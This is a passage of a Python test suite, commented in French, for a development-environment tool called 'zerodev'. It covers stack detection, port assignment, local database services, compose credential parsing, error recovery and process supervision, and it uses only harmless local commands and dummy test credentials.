        self.assertEqual([i["name"] for i in items], ["a/ok"])
        self.assertGreaterEqual(len(mod.QUERIES), 40)      # 5 langages × 5 types × 2 tranches


class TestNetworkErrors(Base):
    def test_fetch_failure_is_a_clean_zero_error(self):
        from zerodev.util import fetch
        with self.assertRaises(ZeroError) as cm:
            fetch("http://127.0.0.1:9/nope", timeout=2)     # port fermé
        self.assertIn("téléchargement impossible", str(cm.exception))


class TestLocalServices(Base):
    def test_find_bin_searches_versioned_dirs_newest_first(self):
        for v in ("14", "16"):
            b = self.tmp / "pg" / v / "bin"
            b.mkdir(parents=True)
            exe = b / "zero-fake-tool"
            exe.write_text("#!/bin/sh\n")
            exe.chmod(0o755)
        found = localsvc.find_bin("zero-fake-tool", [str(self.tmp / "pg" / "*" / "bin")])
        self.assertTrue(found.endswith("/16/bin/zero-fake-tool"))
        self.assertIsNone(localsvc.find_bin("zero-absent-tool", [str(self.tmp / "nothing" / "*")]))

    def test_unsupported_kinds_have_no_local_backend(self):
        self.assertFalse(localsvc.available("rabbitmq"))
        self.assertIn("mysql", localsvc.SUPPORTED)
        self.assertNotIn("rabbitmq", localsvc.SUPPORTED)

    def _svc(self, kind="redis"):
        return services.Service(kind, "x", 6379, 6379, {}, {"REDIS_URL": "redis://localhost:{port}"})

    def test_backend_selection_modes(self):
        from unittest import mock
        svc = self._svc()
        with mock.patch.object(services, "container_cli", return_value="/usr/bin/docker"), \
             mock.patch.object(localsvc, "available", return_value=True):
            self.assertEqual(services.ServiceManager("p", [svc], "auto")._backend(svc), "container")
            self.assertEqual(services.ServiceManager("p", [svc], "local")._backend(svc), "local")
            self.assertEqual(services.ServiceManager("p", [svc], "container")._backend(svc), "container")
        with mock.patch.object(services, "container_cli", return_value=None), \
             mock.patch.object(localsvc, "available", return_value=True):
            self.assertEqual(services.ServiceManager("p", [svc], "auto")._backend(svc), "local")      # repli
            self.assertIsNone(services.ServiceManager("p", [svc], "container")._backend(svc))          # mode strict
        with mock.patch.object(services, "container_cli", return_value=None), \
             mock.patch.object(localsvc, "available", return_value=False):
            self.assertIsNone(services.ServiceManager("p", [svc], "auto")._backend(svc))

    def test_missing_everything_warns_and_continues(self):
        from unittest import mock
        svc = self._svc()
        with mock.patch.object(services, "container_cli", return_value=None), \
             mock.patch.object(localsvc, "available", return_value=False):
            self.assertEqual(services.ServiceManager("p", [svc]).start(), {})     # pas d'exception, pas d'URL

    @unittest.skipUnless(localsvc.available("redis"), "redis-server absent")
    def test_real_redis_start_and_stop(self):
        from zerodev.util import free_port, port_open
        port = free_port(16379)
        svc = services.Service("redis", "x", 6379, port, {}, {"REDIS_URL": "redis://localhost:{port}/0"})
        mgr = services.ServiceManager("zt-redis", [svc], "local")
        try:
            env = mgr.start()
            self.assertEqual(env["REDIS_URL"], f"redis://localhost:{port}/0")
            self.assertTrue(port_open(port))
        finally:
            mgr.stop()
        self.assertFalse(port_open(port))                 # arrêt propre : le port est libéré

    @unittest.skipUnless(localsvc.available("postgres") and localsvc._pg_runner() is not None, "postgres exécutable absent")
    def test_real_postgres_start_persist_and_stop(self):
        import subprocess
        from zerodev.util import free_port, port_open
        port = free_port(15432)
        svc = services.Service("postgres", "x", 5432, port, {}, {"DATABASE_URL": "postgresql://zero:zero@localhost:{port}/app"})
        project = f"zt-pg-{os.getpid()}"
        mgr = services.ServiceManager(project, [svc], "local")
        psql = localsvc._pg("psql")
        try:
            self.assertEqual(mgr.start()["DATABASE_URL"], f"postgresql://zero:zero@localhost:{port}/app")
            out = subprocess.run([psql, "-h", "127.0.0.1", "-p", str(port), "-U", "zero", "app", "-tAc", "select 41+1"],
                                 capture_output=True, text=True)
            self.assertEqual(out.stdout.strip(), "42")        # la base « app » existe vraiment
        finally:
            mgr.stop()
            import shutil
            shutil.rmtree(localsvc.service_dir(project, "postgres").parent, ignore_errors=True)
        self.assertFalse(port_open(port))


    @unittest.skipUnless(localsvc.available("mysql"), "mariadb/mysql absent")
    def test_real_mysql_start_persist_and_stop(self):
        import subprocess
        from zerodev.util import free_port, port_open
        port = free_port(13306)
        svc = services.Service("mysql", "x", 3306, port, {}, {"DATABASE_URL": "mysql://root:zero@localhost:{port}/app"})
        project = f"zt-my-{os.getpid()}"
        client = localsvc._mysql_bins()["client"]
        q = [client, "-h", "127.0.0.1", "-P", str(port), "-uroot", "-pzero", "app", "-N", "-e"]
        try:
            for run in (1, 2):                              # 2e démarrage : données et mot de passe conservés
                mgr = services.ServiceManager(project, [svc], "local")
                self.assertEqual(mgr.start()["DATABASE_URL"], f"mysql://root:zero@localhost:{port}/app")
                try:
                    if run == 1:
                        subprocess.run(q + ["create table t(i int); insert into t values (42)"], check=True)
                    out = subprocess.run(q + ["select i from t"], capture_output=True, text=True)
                    self.assertEqual(out.stdout.strip(), "42")
                finally:
                    mgr.stop()
                self.assertFalse(port_open(port))
        finally:
            import shutil
            shutil.rmtree(localsvc.service_dir(project, "mysql").parent, ignore_errors=True)

class TestRealMysqlCompose(unittest.TestCase):
    @unittest.skipUnless(localsvc.available("mysql"), "mariadb/mysql absent")
    def test_app_user_and_database_are_created(self):
        import shutil
        import subprocess
        from zerodev.util import free_port
        port = free_port(13307)
        creds = {"MYSQL_USER": "shop", "MYSQL_PASSWORD": "pw1", "MYSQL_DATABASE": "shopdb"}
        svc = services.Service("mysql", "x", 3306, port, dict(creds),
                               {"DATABASE_URL": "mysql://shop:pw1@localhost:{port}/shopdb"})
        project = f"zt-myc-{os.getpid()}"
        client = localsvc._mysql_bins()["client"]
        try:
            for _ in (1, 2):                              # 2e démarrage : idempotent
                mgr = services.ServiceManager(project, [svc], "local")
                mgr.start()
                try:
                    out = subprocess.run([client, "-h", "127.0.0.1", "-P", str(port), "-ushop", "-ppw1",
                                          "shopdb", "-N", "-e", "select 7"], capture_output=True, text=True)
                    self.assertEqual(out.stdout.strip(), "7", out.stderr)
                finally:
                    mgr.stop()
        finally:
            shutil.rmtree(localsvc.service_dir(project, "mysql").parent, ignore_errors=True)


class TestMultiStack(Base):
    def stack_repo(self, **extra):
        files = {"backend/requirements.txt": "x\n", "backend/app.py": "",
                 "frontend/package.json": '{"scripts":{"dev":"vite"}}'}
        files.update(extra)
        return self.repo(files, "ms")

    def test_detect_stacks_needs_two_languages(self):
        stacks = plan.detect_stacks(self.stack_repo())
        self.assertEqual([(n, p.lang) for n, _, p in stacks], [("backend", "python"), ("frontend", "node")])
        same = self.repo({"package.json": '{"scripts":{"dev":"x"}}', "web/package.json": '{"scripts":{"dev":"y"}}'}, "same")
        self.assertEqual(plan.detect_stacks(same), [])                     # un seul langage : pas un multi-stack

    def test_procfile_disables_multistack(self):
        self.assertEqual(plan.detect_stacks(self.stack_repo(Procfile="web: python backend/app.py\n")), [])

    def test_root_plus_subdir_and_note(self):
        r = self.repo({"package.json": '{"scripts":{"dev":"vite"}}', "backend/requirements.txt": "x\n", "backend/app.py": ""}, "rootms")
        self.assertEqual([n for n, _, _ in plan.detect_stacks(r)], ["root", "backend"])
        ctx = core.make_plan(r, use_lock=False)
        self.assertEqual(ctx.plan.lang, "node")
        self.assertTrue(any("zero --all" in n for n in ctx.plan.notes))     # signalé, pas lancé silencieusement

    def test_root_wrapper_of_same_language_is_dropped(self):
        r = self.repo({"package.json": '{"workspaces":["frontend"],"scripts":{"dev":"npm run dev -w frontend"}}',
                       "frontend/package.json": '{"scripts":{"dev":"vite"}}',
                       "backend/requirements.txt": "x\n", "backend/app.py": ""}, "tmpl")
        self.assertEqual([(n, p.lang) for n, _, p in plan.detect_stacks(r)],
                         [("backend", "python"), ("frontend", "node")])     # pas de 3e entrée « root » node

    def test_ambiguous_message_mentions_all(self):
        with self.assertRaises(plan.AmbiguousProject) as cm:
            plan.resolve_project(self.stack_repo())
        self.assertIn("--all", str(cm.exception))

    def test_find_stacks_errors_when_single(self):
        with self.assertRaises(ZeroError):
            core.find_stacks(self.repo({"package.json": '{"scripts":{"dev":"x"}}'}, "solo"))

    def test_find_stacks_builds_named_contexts(self):
        ctxs = core.find_stacks(self.stack_repo(), use_lock=False)
        self.assertEqual([(c.name, c.plan.lang, c.root.name) for c in ctxs],
                         [("backend", "python", "backend"), ("frontend", "node", "frontend")])

    def test_supervisor_per_process_cwd_and_env(self):
        a, b = self.tmp / "a", self.tmp / "b"
        a.mkdir(); b.mkdir()
        (a / "who").write_text("A"); (b / "who").write_text("B")
        res = Supervisor(self.tmp, dict(os.environ)).run({
            "one": ("cat who; echo $TAG", a, dict(os.environ, TAG="x1")),
            "two": ("cat who; echo $TAG; sleep 0.5", b, dict(os.environ, TAG="x2")),
        })
        self.assertIn("A", res.tail); self.assertIn("x1", res.tail)
        self.assertIn("B", res.tail); self.assertIn("x2", res.tail)

    def test_cli_accepts_options_between_command_and_target(self):
        from zerodev.cli import build_parser
        args = build_parser().parse_intermixed_args(["plan", "--all", "/some/dir"])
        self.assertEqual((args.command, args.target, args.all_stacks), ("plan", "/some/dir", True))


class TestAssignPorts(Base):
    def _ctx(self, name, lang, files=None):
        from types import SimpleNamespace as NS
        return NS(name=name, root=self.repo(files or {}, name=name), plan=NS(lang=lang))

    def test_distinct_ports_per_stack(self):
        from zerodev import core
        os.environ.pop("PORT", None)
        ctxs = [self._ctx("a", "node"), self._ctx("b", "node"), self._ctx("c", "python")]
        envs = [{}, {}, {}]
        ports = core.assign_ports(ctxs, envs)
        self.assertEqual(len(set(ports.values())), 3)
        self.assertEqual([e["PORT"] for e in envs], [str(p) for p in ports.values()])

    def test_respects_dotenv_port(self):
        from zerodev import core
        os.environ.pop("PORT", None)
        ctxs = [self._ctx("a", "node", {".env": "PORT=4000\n"}), self._ctx("b", "python")]
        envs = [{}, {}]
        ports = core.assign_ports(ctxs, envs)
        self.assertNotIn("PORT", envs[0])
        self.assertEqual(list(ports), ["b"])


class TestLinkStacks(Base):
    def _ctx(self, name, files=None):
        from types import SimpleNamespace as NS
        return NS(name=name, root=self.repo(files or {}, name=name), plan=NS(lang="x"))

    def test_frontend_receives_backend_url(self):
        from zerodev import core
        for v in core.API_URL_VARS:
            os.environ.pop(v, None)
        ctxs = [self._ctx("backend"), self._ctx("frontend")]
        envs = [{}, {}]
        linked = core.link_stacks(ctxs, envs, {"backend": 8123, "frontend": 3123})
        self.assertEqual(linked, {"frontend": "http://localhost:8123"})
        self.assertEqual(envs[1]["API_URL"], "http://localhost:8123")
        self.assertEqual(envs[0], {})                      # le backend n'est pas touché

    def test_existing_dotenv_var_not_overridden_and_no_backend_port(self):
        from zerodev import core
        ctxs = [self._ctx("backend"), self._ctx("frontend", {".env": "API_URL=http://x\n"})]
        envs = [{}, {}]
        core.link_stacks(ctxs, envs, {"backend": 8123})
        self.assertNotIn("API_URL", envs[1])
        self.assertEqual(envs[1]["VITE_API_URL"], "http://localhost:8123")
        envs2 = [{}, {}]
        self.assertEqual(core.link_stacks(ctxs, envs2, {"frontend": 3000}), {})   # port du backend inconnu


class TestSignals(Base):
    def test_handlers_installed(self):
        import signal as sg
        from zerodev import cli
        old = (sg.getsignal(sg.SIGINT), sg.getsignal(sg.SIGTERM))
        try:
            sg.signal(sg.SIGINT, sg.SIG_IGN)               # cas du shell non interactif
            cli.install_signal_handlers()
            self.assertIs(sg.getsignal(sg.SIGINT), sg.default_int_handler)
            with self.assertRaises(KeyboardInterrupt):
                sg.getsignal(sg.SIGTERM)(sg.SIGTERM, None)
        finally:
            sg.signal(sg.SIGINT, old[0]); sg.signal(sg.SIGTERM, old[1])

    def test_ignored_sigint_still_cleans_children(self):
        """zero lancé avec SIGINT ignoré : SIGTERM puis SIGINT arrêtent quand même l'enfant."""
        import signal as sg, subprocess, sys, time
        token = f"zt{os.getpid():x}{int(time.time() * 1000) % 0xFFFFFF:x}"          # nom unique : aucun autre processus ne le porte
        repo = self.repo({"requirements.txt": "", f"{token}.py": "import time\nprint('up', flush=True)\ntime.sleep(300)\n"})
        env = dict(os.environ, PYTHONPATH=str(Path(__file__).resolve().parent.parent / "src"), ZERO_HOME=str(self.tmp / "zh"))
        p = subprocess.Popen([sys.executable, "-m", "zerodev", "run", "--no-services", "--no-lock",
                              "--cmd", f"python {token}.py", str(repo)],
                             stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=env, start_new_session=True,
                             preexec_fn=lambda: sg.signal(sg.SIGINT, sg.SIG_IGN))
        lines = []
        t0 = time.time()
        while time.time() - t0 < 90:
            l = p.stdout.readline()
            lines.append(l)
            if "up" == l.strip().split("|")[-1].strip() or l.strip() == "up":
                break
        try:
            p.send_signal(sg.SIGINT)
            p.wait(timeout=20)
        finally:
            if p.poll() is None:
                os.killpg(p.pid, sg.SIGKILL)
        time.sleep(0.5)
        self.assertTrue(any("up" == l.strip().split("|")[-1].strip() or l.strip() == "up" for l in lines),
                        "le script n'a jamais démarré : test sans valeur\n" + "".join(lines)[-400:])
        out = subprocess.run(f"ps -eo args | grep '{token[:-1]}[{token[-1]}]'", shell=True, capture_output=True, text=True).stdout
        self.assertEqual(out.strip(), "", "".join(lines)[-400:])


class TestFatalWhileRunning(Base):
    def test_alive_but_fatal_is_a_failure(self):
        from zerodev.supervisor import Supervisor
        sup = Supervisor(self.tmp, dict(os.environ))
        cmd = "echo ok; echo \"[ERROR] connection to ('::', 8000) failed: [Errno 97] Address family not supported by protocol\"; sleep 60"
        res = sup.run({"web": cmd})
        self.assertEqual(res.failed, "web")
        self.assertNotEqual(res.code, 0)
        self.assertFalse(res.interrupted)
        self.assertLess(res.uptime, 20)                       # n'a pas attendu la fin du sleep
        self.assertIn("Address family", res.tail)


class TestSupervisor(Base):
    def test_exit_code_and_tail(self):
        res = Supervisor(self.tmp, dict(os.environ)).run({"main": "echo boom; exit 3"})
        self.assertEqual(res.code, 3)
        self.assertIn("boom", res.tail)
        self.assertFalse(res.interrupted)

    def test_first_exit_stops_others(self):
        res = Supervisor(self.tmp, dict(os.environ)).run({"web": "sleep 30", "job": "exit 0"})
        self.assertEqual(res.failed, "job")
        self.assertLess(res.uptime, 15)


class TestBenchAndExamples(Base):
    def test_detection_on_examples(self):
        corpus = self.tmp / "corpus.txt"
        corpus.write_text("\n".join(["# exemples", *map(str, sorted(EXAMPLES.iterdir()))]) + "\n/nulle/part\n")
        out = self.tmp / "report.json"
        summary = bench.run_bench(corpus, self.tmp / "wd", full=False, timeout=5, out=out)
        self.assertEqual((summary["repos"], summary["detected"]), (6, 4))
        self.assertEqual(summary["status"]["ambiguous_monorepo"], 1)       # multistack-app sans --all
        self.assertEqual(summary["status"]["clone_failed"], 1)
        report = json.loads(out.read_text())
        langs = {Path(r["repo"]).name: r.get("lang") for r in report["results"]}
        self.assertEqual(langs["node-app"], "node")
        self.assertEqual(langs["rust-app"], "rust")
        full = {Path(r["repo"]).name: r for r in report["results"]}["fullstack-app"]
        self.assertEqual(sorted(full["services"]), ["postgres", "redis"])

    def test_summarize_full(self):
        s = bench.summarize([
            {"detected": True, "built": True, "launched": True, "ttfr_s": 10, "interventions_auto": 1, "interventions_manual": 0},
            {"detected": True, "built": False, "launched": False, "ttfr_s": None},
        ], full=True)
        self.assertEqual((s["launch_rate"], s["median_ttfr_s"], s["zero_touch"]), (0.5, 10, 1))


if __name__ == "__main__":
    unittest.main()


class TestBenchProbe(unittest.TestCase):
    def test_listening_ports_and_http(self):
        import subprocess, sys, time
        from zerodev import bench
        srv = subprocess.Popen([sys.executable, "-m", "http.server", "0", "--bind", "127.0.0.1"],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            ports = []
            for _ in range(40):
                ports = bench.listening_ports(srv.pid)
                if ports:
                    break
                time.sleep(0.1)
            self.assertTrue(ports)
            probe = bench.http_probe(ports)
            self.assertEqual(probe["port"], ports[0])
        finally:
            srv.terminate()
            srv.wait()

    def test_http_probe_closed_port(self):
        from zerodev import bench
        self.assertIsNone(bench.http_probe([1]))


class TestBunAndBareCli(unittest.TestCase):
    def test_bun_detected_from_lockfile_and_scripts(self):
        with tempfile.TemporaryDirectory() as d:
            r = Path(d)
            (r / "package.json").write_text(json.dumps({"scripts": {"dev": "bun run --filter frontend dev"}}))
            p = plan.detect_node(r)
            self.assertEqual(p.pm, "bun")
            self.assertEqual(p.install[0], "bun install")
            self.assertEqual(p.run, "bun run dev")

    def test_bun_lockfile(self):
        with tempfile.TemporaryDirectory() as d:
            r = Path(d)
            (r / "package.json").write_text(json.dumps({"scripts": {"start": "node x.js"}}))
            (r / "bun.lock").write_text("")
            self.assertEqual(plan.detect_node(r).pm, "bun")

    def test_npm_still_default(self):
        with tempfile.TemporaryDirectory() as d:
            r = Path(d)
            (r / "package.json").write_text(json.dumps({"scripts": {"dev": "vite"}}))
            self.assertEqual(plan.detect_node(r).pm, "npm")

    def test_bare_framework_cli_is_not_a_run_command(self):
        self.assertIsNone(plan.usable_script("flask"))
        self.assertEqual(plan.usable_script("myapp"), "myapp")
        self.assertIsNone(plan.usable_script(None))


class TestNpmForNode(unittest.TestCase):
    def test_mapping(self):
        from zerodev import runtimes
        self.assertEqual(runtimes.npm_for_node(6), "3")
        self.assertEqual(runtimes.npm_for_node(8), "6")
        self.assertEqual(runtimes.npm_for_node(10), "6")
        self.assertEqual(runtimes.npm_for_node(14), "8")
        self.assertIsNone(runtimes.npm_for_node(20))


class TestPostgresLibpqEnv(unittest.TestCase):
    def test_libpq_variables_exposed(self):
        s = services.Service("postgres", "postgres:16", 5432, 5544, {},
                             dict(services.KNOWN["postgres"]["urls"]))
        env = s.env()
        self.assertEqual(env["PGHOST"], "localhost")
        self.assertEqual(env["PGPORT"], "5544")
        self.assertIn(":5544/app", env["DATABASE_URL"])


class TestComposePostgresCreds(unittest.TestCase):
    def _repo(self, compose):
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        r = Path(d.name)
        (r / "docker-compose.yml").write_text(compose)
        return r

    def test_literal_creds_are_read(self):
        r = self._repo("services:\n  db:\n    image: postgres:17\n    environment:\n"
                       "      - POSTGRES_USER=djangoproject\n      - POSTGRES_PASSWORD=secret\n"
                       "      - POSTGRES_DB=djangoproject\n")
        svc = [s for s in services.detect_services(r) if s.kind == "postgres"][0]
        self.assertEqual(svc.container_env["POSTGRES_USER"], "djangoproject")
        env = svc.env()
        self.assertIn("djangoproject:secret@localhost", env["DATABASE_URL"])
        self.assertEqual(env["PGUSER"], "djangoproject")
        self.assertEqual(env["PGDATABASE"], "djangoproject")

    def test_yaml_map_syntax_and_default_interpolation(self):
        r = self._repo("services:\n  db:\n    image: postgres:16\n    environment:\n"
                       "      POSTGRES_USER: ${DB_USER:-bob}\n      POSTGRES_PASSWORD: ${SECRET}\n"
                       "      POSTGRES_DB: shop\n")
        c = services._compose_postgres_creds(r)
        self.assertEqual(c, {"POSTGRES_USER": "bob", "POSTGRES_DB": "shop"})

    def test_partial_creds_keep_zero_defaults(self):
        r = self._repo("services:\n  db:\n    image: postgres:16\n    environment:\n      POSTGRES_DB: shop\n")
        svc = [s for s in services.detect_services(r) if s.kind == "postgres"][0]
        self.assertEqual(svc.container_env["POSTGRES_USER"], "zero")
        self.assertIn("zero:zero@localhost", svc.env()["DATABASE_URL"])
        self.assertTrue(svc.env()["DATABASE_URL"].endswith("/shop"))


class TestShouldMigrate(unittest.TestCase):
    def _repo(self, manage=True, deps="django\n"):
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        r = Path(d.name)
        if manage:
            (r / "manage.py").write_text("")
        (r / "requirements.txt").write_text(deps)
        return r

    def _plan(self, run="python manage.py runserver", processes=None):
        return plan.Plan("python", None, "x", [], run, processes=processes or {})

    def _pg(self):
        return [services.Service("postgres", "x", 5432, 5432, {}, {})]

    def test_django_with_zero_database(self):
        r = self._repo()
        self.assertTrue(core.should_migrate(r, self._plan(), self._pg(), {"DATABASE_URL": "x"}))

    def test_no_zero_database_means_no_migrate(self):
        r = self._repo()
        self.assertFalse(core.should_migrate(r, self._plan(), [], {}))

    def test_not_django(self):
        r = self._repo(deps="flask\n")
        self.assertFalse(core.should_migrate(r, self._plan(), self._pg(), {"DATABASE_URL": "x"}))

    def test_existing_migrate_in_command(self):
        r = self._repo()
        p = self._plan(run="sh -c 'python manage.py migrate && gunicorn app'")
        self.assertFalse(core.should_migrate(r, p, self._pg(), {"DATABASE_URL": "x"}))
        p = self._plan(processes={"release": "python manage.py migrate", "web": "gunicorn app"})
        self.assertFalse(core.should_migrate(r, p, self._pg(), {"DATABASE_URL": "x"}))


class TestComposeMysqlCreds(unittest.TestCase):
    def _repo(self, compose):
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        r = Path(d.name)
        (r / "docker-compose.yml").write_text(compose)
        return r

    def test_user_and_database_from_compose(self):
        r = self._repo("services:\n  db:\n    image: mariadb:11\n    environment:\n"
                       "      MYSQL_USER: shop\n      MYSQL_PASSWORD: pw1\n      MYSQL_DATABASE: shopdb\n"
                       "      MYSQL_ROOT_PASSWORD: rootpw\n")
        svc = [s for s in services.detect_services(r) if s.kind == "mysql"][0]
        self.assertEqual(svc.env()["DATABASE_URL"], f"mysql://shop:pw1@localhost:{svc.port}/shopdb")
        self.assertEqual(svc.container_env["MYSQL_ROOT_PASSWORD"], "zero")   # root reste celui de zero

    def test_database_only_keeps_root(self):
        r = self._repo("services:\n  db:\n    image: mysql:8\n    environment:\n      - MYSQL_DATABASE=blog\n")
        svc = [s for s in services.detect_services(r) if s.kind == "mysql"][0]
        self.assertTrue(svc.env()["DATABASE_URL"].startswith("mysql://root:zero@localhost:"))
        self.assertTrue(svc.env()["DATABASE_URL"].endswith("/blog"))

    def test_sql_statements(self):
        self.assertEqual(localsvc.mysql_account_statements({}), [])
        st = localsvc.mysql_account_statements({"MYSQL_USER": "u", "MYSQL_PASSWORD": "p", "MYSQL_DATABASE": "d"})
        self.assertIn("CREATE DATABASE IF NOT EXISTS `d`", st)
        self.assertTrue(any("'u'@'127.0.0.1'" in x for x in st))


class TestMigrateStack(unittest.TestCase):
    def _ctx(self, with_db=True, django=True):
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        r = Path(d.name)
        (r / "manage.py").write_text("")
        (r / "requirements.txt").write_text("django\n" if django else "flask\n")
        pl = plan.Plan("python", None, "x", [], "python manage.py runserver")
        svcs = [services.Service("postgres", "x", 5432, 5432, {}, {})] if with_db else []
        return core.Context(root=r, plan=pl, services=svcs, gpu={}, fp="x", name="backend")

    def test_migrates_when_stack_has_zero_database(self):
        from unittest import mock
        c = self._ctx()
        with mock.patch.object(core, "run_django_migrate", return_value=True) as m:
            self.assertTrue(core.migrate_stack(c, {}, {"DATABASE_URL": "x"}))
            m.assert_called_once()

    def test_skips_without_database_or_django(self):
        from unittest import mock
        with mock.patch.object(core, "run_django_migrate", return_value=True) as m:
            self.assertFalse(core.migrate_stack(self._ctx(with_db=False), {}, {}))
            self.assertFalse(core.migrate_stack(self._ctx(django=False), {}, {"DATABASE_URL": "x"}))
            m.assert_not_called()


class TestPsycopg2MissingHeaders(unittest.TestCase):
    def test_header_missing_triggers_binary_swap(self):
        from zerodev.recovery import diagnose_psycopg2 as d
        p = plan.Plan("python", None, "x", [], "x")
        self.assertTrue(d(p, "./psycopg/psycopg.h:30:10: fatal error: pg_config.h: No such file or directory"))
        self.assertTrue(d(p, "fatal error: libpq-fe.h: No such file or directory"))
        self.assertFalse(d(p, "fatal error: Python.h: No such file or directory"))


class TestRunTeeKeepsHead(unittest.TestCase):
    def test_early_error_line_survives_long_output(self):
        from zerodev.util import run_tee
        import contextlib
        cmd = "echo 'fatal error: pg_config.h: No such file'; seq 1 500; echo fin"
        with contextlib.redirect_stdout(io.StringIO()), tempfile.TemporaryDirectory() as d:
            code, out = run_tee(cmd, Path(d), dict(os.environ))
        self.assertEqual(code, 0)
        self.assertIn("pg_config.h: No such file", out)
        self.assertTrue(out.endswith("fin"))
        self.assertLess(len(out.splitlines()), 360)


class TestSwapNoopForBinary(unittest.TestCase):
    def test_binary_pin_is_unchanged_by_swap_then_unpinned(self):
        from zerodev.recovery import swap_psycopg2
        lines = ["Django==4.0.3", "psycopg2-binary==2.9.3"]
        self.assertEqual(swap_psycopg2(lines), lines)
        self.assertEqual(swap_psycopg2(lines, keep_version=False)[1], "psycopg2-binary")


class TestPyLauncherRecovery(unittest.TestCase):
    def test_missing_gunicorn_is_installed(self):
        with tempfile.TemporaryDirectory() as d:
            p = plan.Plan("python", None, "x", [], "gunicorn app:app")
            fixes = recovery.diagnose(p, Path(d), "/bin/sh: 1: gunicorn: not found", set())
            self.assertEqual(len(fixes), 1)
            self.assertIn("gunicorn", fixes[0].commands[0])

    def test_not_for_other_languages_or_unknown_tools(self):
        with tempfile.TemporaryDirectory() as d:
            n = plan.Plan("node", None, "x", [], "gunicorn app:app")
            self.assertFalse([f for f in recovery.diagnose(n, Path(d), "gunicorn: not found", set()) if f.commands])
            p = plan.Plan("python", None, "x", [], "foo")
            self.assertFalse([f for f in recovery.diagnose(p, Path(d), "foo: not found", set()) if f.commands])


class TestOptionalSelfInstall(unittest.TestCase):
    def _plan(self, steps):
        return plan.Plan("python", None, "x", steps, "x")

    def test_editable_after_requirements_is_optional(self):
        steps = ["uv venv v", "uv pip install --python v/bin/python -r requirements.txt",
                 "uv pip install --python v/bin/python -e ."]
        self.assertTrue(core.optional_self_install(self._plan(steps), steps[2]))

    def test_editable_alone_is_required(self):
        steps = ["uv venv v", "uv pip install --python v/bin/python -e ."]
        self.assertFalse(core.optional_self_install(self._plan(steps), steps[1]))

    def test_requirements_step_is_never_optional(self):
        steps = ["uv pip install -r requirements.txt", "uv pip install -e ."]
        self.assertFalse(core.optional_self_install(self._plan(steps), steps[0]))


class TestPipenv(unittest.TestCase):
    def _repo(self, files):
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        r = Path(d.name)
        for n, c in files.items():
            (r / n).write_text(c)
        return r

    def test_pipfile_without_lock(self):
        r = self._repo({"Pipfile": '[packages]\nflask = "*"\nrequests = ">=2.0"\n'
                                   'celery = {version = "==5.3.0", extras = ["redis"]}\n'
                                   'private = {git = "https://x/y.git"}\n[requires]\npython_version = "3.11"\n',
                        "app.py": "from flask import Flask\napp = Flask(__name__)\napp.run()\n"})
        p = plan.detect_python(r)
        self.assertIsNotNone(p)
        self.assertEqual(p.version, "3.11")
        step = [s for s in p.install if "uv pip install" in s][0]
        for want in ("flask", "'requests>=2.0'", "'celery[redis]==5.3.0'"):
            self.assertIn(want, step)
        self.assertNotIn("private", step)

    def test_pipfile_lock_pins_are_used(self):
        r = self._repo({"Pipfile": '[packages]\nflask = "*"\n',
                        "Pipfile.lock": json.dumps({"default": {
                            "flask": {"version": "==2.0.1"},
                            "dev-tool": {"git": "https://x/y.git", "ref": "abc"}}}),
                        "app.py": "print(1)\n"})
        step = [s for s in plan.detect_python(r).install if "uv pip install" in s][0]
        self.assertIn("flask==2.0.1", step)
        self.assertNotIn("dev-tool", step)

    def test_requirements_txt_still_wins(self):
        r = self._repo({"Pipfile": '[packages]\nflask = "*"\n', "requirements.txt": "flask==1\n"})
        self.assertTrue(any("-r" in s for s in plan.detect_python(r).install))


class TestOldPythonFallback(unittest.TestCase):
    def _p(self, v):
        return plan.Plan("python", v, "x", [], "x")

    def test_patch_version_falls_back_to_minor(self):
        from zerodev.recovery import diagnose_python_patch as d
        self.assertEqual(d(self._p("3.8.1"), "error: No interpreter found for Python 3.8.1 in managed"), "3.8")

    def test_unsupported_old_minor_falls_back_to_oldest(self):
        from zerodev.recovery import diagnose_python_patch as d
        self.assertEqual(d(self._p("3.6"), "error: No interpreter found for Python 3.6 in managed"), "3.8")
        self.assertEqual(d(self._p("3.7.4"), "No interpreter found for Python 3.7.4 in"), "3.8")

    def test_no_loop_and_no_fallback_for_current_minor(self):
        from zerodev.recovery import diagnose_python_patch as d
        self.assertIsNone(d(self._p("3.8"), "No interpreter found for Python 3.6 in managed"))
        self.assertIsNone(d(self._p("3.12"), "No interpreter found for Python 3.12 in managed"))


class TestSoftPipfileStep(unittest.TestCase):
    def test_lock_step_is_soft_only_with_a_project_install(self):
        with tempfile.TemporaryDirectory() as d:
            r = Path(d)
            (r / "Pipfile").write_text('[packages]\nflask = "*"\n')
            (r / "app.py").write_text("print(1)\n")
            self.assertEqual(plan.detect_python(r).soft_steps, [])
            (r / "setup.py").write_text("from setuptools import setup\nsetup()\n")
            p = plan.detect_python(r)
            self.assertEqual(len(p.soft_steps), 1)
            self.assertIn("flask", p.soft_steps[0])
            self.assertEqual(p.install[-1].split()[-2:], ["-e", "."])


class TestDaemonAdoption(unittest.TestCase):
    @unittest.skipUnless(sys.platform.startswith("linux"), "Linux seulement")
    def test_detached_daemon_is_adopted_and_stopped(self):
        import time
        from zerodev import procs
        from zerodev.supervisor import Supervisor
        self.assertTrue(procs.become_subreaper(True))
        self.addCleanup(procs.become_subreaper, False)
        with tempfile.TemporaryDirectory() as d:
            sup = Supervisor(Path(d), dict(os.environ))
            # le shell lance un « démon » puis sort : sleep est orphelin, donc adopté par zero
            sup.spawn("web", "sleep 300 </dev/null >/dev/null 2>&1 & echo $! > pid.txt; exit 0", Path(d))
            p = sup.procs["web"]
            p.wait(timeout=10)
            for _ in range(50):
                if (Path(d) / "pid.txt").exists() and (Path(d) / "pid.txt").read_text().strip():
                    break
                time.sleep(0.1)
            pid = int((Path(d) / "pid.txt").read_text())
            self.assertTrue(procs.is_alive(pid))
            self.assertIn(pid, sup.adopted())
            sup.stop_all()
            self.assertFalse(procs.is_alive(pid))

    def test_kill_tree_ignores_dead_pids(self):
        from zerodev import procs
        procs.kill_tree({2 ** 22 - 3})          # pid inexistant : aucune exception


class TestMakefileRun(unittest.TestCase):
    def _repo(self, makefile):
        d = tempfile.TemporaryDirectory()
